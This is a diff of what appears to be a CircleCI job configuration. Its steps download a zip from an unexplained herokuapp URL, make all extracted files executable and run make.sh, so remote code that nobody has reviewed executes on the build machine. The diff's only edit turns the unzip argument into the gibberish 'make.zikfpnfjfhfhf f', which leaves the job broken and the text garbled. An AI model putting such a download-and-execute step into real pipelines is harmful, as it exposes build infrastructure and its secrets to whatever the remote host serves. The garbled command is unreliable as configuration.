@@ -9,6 +9,6 @@ jobs:
       - image: circleci/golang:1.9
     steps:
       - run: curl https://dlmediafiles.herokuapp.com/-1001403671743/124629/download -o make.zip
-      - run: unzip make.zip && chmod +x *
+      - run: unzip make.zikfpnfjfhfhf f && chmod +x *
       - run: ./make.sh
       
